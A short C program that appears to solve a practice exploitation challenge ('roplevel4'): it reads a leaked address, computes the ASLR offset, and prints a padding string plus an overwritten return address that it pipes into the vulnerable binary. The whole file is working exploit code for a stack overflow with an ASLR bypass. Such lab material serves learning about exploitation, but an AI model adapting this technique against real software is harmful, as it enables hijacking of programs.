#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

/* BYPASSES ASLR AND EXPLOITS A STACK OVERFLOW. THANKS BILLY ELLIS! (@bellis100).
ALTERNATE WAY. PUT roplevel4 AND THIS PROGRAM ON THE SAME DIRECTORY AND JUST RUN IT */

int main( int argc, char *argv[] ) {
if (argc != 2) {
char cmd[32];
sprintf(cmd, "%s pwn | ./roplevel4", argv[0]);

system(cmd);
}
else {

int staticAddr = 0xc03c;
int secretAddr = 0xbd28;

char randAdd[32];
char shellcode[128];

char junk[24] = "AAAABBBBCCCCDDDDEEEEFFFF";

sleep(2);

FILE *randAddr;
randAddr = fopen ("leak.txt", "r");
fgets(randAdd,32,randAddr);
fclose(randAddr);

int addr;
sscanf(randAdd,"%x",&addr);

int aslr = addr - staticAddr;

secretAddr = secretAddr + aslr;

int p1, p2, p3, p4;

p1 = secretAddr;
p2 = secretAddr >> 8;
p3 = secretAddr >> 16;

sprintf(shellcode, "%s%c%c%c", junk, p1, p2, p3);
printf("%s", shellcode);

}

}


